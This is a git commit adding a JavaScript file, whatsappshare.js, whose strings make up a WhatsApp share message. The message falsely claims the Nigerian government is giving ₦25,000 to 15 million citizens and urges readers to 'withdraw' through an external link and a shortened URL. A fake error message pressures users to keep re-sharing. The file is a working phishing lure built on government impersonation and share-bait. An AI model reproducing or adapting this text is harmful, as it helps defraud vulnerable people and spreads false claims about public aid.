f6fef0c68fc233807aea35fd4295c662d902b5d2
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-01-23 21:28:20 -0800

    Add files via upload

---
+++ whatsappshare.js
@@ -0,0 +1,9 @@
+
+        var text1 = "*₦25,000 Conditional Cash Transfer For this Month*%0A%0A*Dont Miss this Month FG ₦25,000 CCT*%0A%0A*FG has disbursed ₦25,000 each to 15 million Nigerians* %0A%0A*The 2024 Renewed Hope Conditional Cash Transfer of President Bola Tinubu’s administration would provide 15 million Nigerian with a cash transfer of ₦25,000 for three months*%0A%0A_Check if you are among the 15 million Nigerians to withdraw_ ₦25,000 each%0A%0A*WITHDRAW FOR THIS MONTH* 👇%0Ahttps://xmas-gift.org/fg25kcash.html",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://bit.ly/yhauajjdng",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+   
